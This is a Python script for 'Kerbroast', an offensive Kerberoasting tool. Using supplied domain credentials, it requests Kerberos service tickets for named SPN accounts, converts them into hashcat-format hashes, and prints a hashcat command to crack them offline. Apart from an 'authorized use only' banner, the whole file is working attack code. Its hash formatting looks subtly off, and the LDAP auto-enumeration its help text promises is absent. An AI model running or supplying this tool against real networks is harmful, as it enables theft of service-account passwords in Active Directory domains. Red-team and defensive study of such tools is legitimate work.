#!/usr/bin/env python3
"""
Kerbroast — Kerberoasting Attack Tool
Requests TGS tickets for SPN accounts and extracts them for offline cracking.
Requires impacket: pip install impacket
Author: Omar Khalid (amooryx) | github.com/amooryx/kerbroast
AUTHORIZED USE ONLY — for authorized red team engagements.
"""

import argparse
import json
import sys
import datetime

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.asn1 import TGS_REP
    import pyasn1.codec.ber.decoder as decoder
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False

def get_tgt(dc: str, domain: str, user: str, password: str, timeout: int = 30):
    if not HAS_IMPACKET:
        print("[!] impacket not installed. Run: pip install impacket")
        sys.exit(1)
    user_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, _, session_key = getKerberosTGT(
        user_principal, password, domain,
        lmhash=b"", nthash=b"",
        kdcHost=dc
    )
    return tgt, cipher, session_key

def request_tgs(tgt, cipher, session_key, domain: str, spn: str, dc: str):
    if not HAS_IMPACKET:
        sys.exit(1)
    spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, cipher2, _, session_key2 = getKerberosTGS(
        spn_principal, domain,
        kdcHost=dc, tgt=tgt, cipher=cipher, sessionKey=session_key
    )
    return tgs, cipher2, session_key2

def tgs_to_hashcat(tgs, cipher, spn: str, domain: str) -> str:
    """Extract encrypted part and format as $krb5tgs$23$*...*"""
    import base64
    from impacket.krb5.asn1 import TGS_REP
    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    enc_part = bytes(decoded["ticket"]["enc-part"]["cipher"])
    enc_b64  = base64.b64encode(enc_part).decode()
    etype    = int(decoded["ticket"]["enc-part"]["etype"])
    user_part = f"*{spn}*{domain.upper()}*{spn}*"
    return f"$krb5tgs${etype}{user_part}{enc_b64}"

def main():
    parser = argparse.ArgumentParser(
        description="Kerbroast — Kerberoasting (Authorized use only)",
    )
    parser.add_argument("--dc",       required=True, help="Domain controller IP")
    parser.add_argument("--domain",   required=True, help="Domain (e.g., corp.local)")
    parser.add_argument("--user",     required=True, help="Low-priv domain username")
    parser.add_argument("--password", required=True)
    parser.add_argument("--spns",     nargs="+", help="SPNs to roast (if not provided, auto-enum via LDAP)")
    parser.add_argument("--out",      help="Output file for hashcat hashes")
    args = parser.parse_args()

    if not HAS_IMPACKET:
        print("[!] impacket required: pip install impacket")
        print("[!] To auto-discover SPNs, also run: python ad_enum.py --spns ...")
        sys.exit(1)

    print(f"[*] Kerberoasting as {args.domain}\\{args.user}")
    tgt, cipher, session_key = get_tgt(args.dc, args.domain, args.user, args.password)
    print(f"[+] TGT obtained for {args.user}")

    spns    = args.spns or []
    hashes  = []
    for spn in spns:
        print(f"[*] Requesting TGS for: {spn}")
        try:
            tgs, cipher2, sk2 = request_tgs(tgt, cipher, session_key, args.domain, spn, args.dc)
            h = tgs_to_hashcat(tgs, cipher2, spn, args.domain)
            hashes.append(h)
            print(f"  [+] Hash extracted: {h[:60]}...")
        except Exception as e:
            print(f"  [!] Failed for {spn}: {e}")

    if args.out:
        with open(args.out, "w") as f:
            f.write("\n".join(hashes))
        print(f"[+] {len(hashes)} hashes written to {args.out}")
        print(f"[*] Crack with: hashcat -m 13100 {args.out} wordlist.txt")

if __name__ == "__main__":
    main()
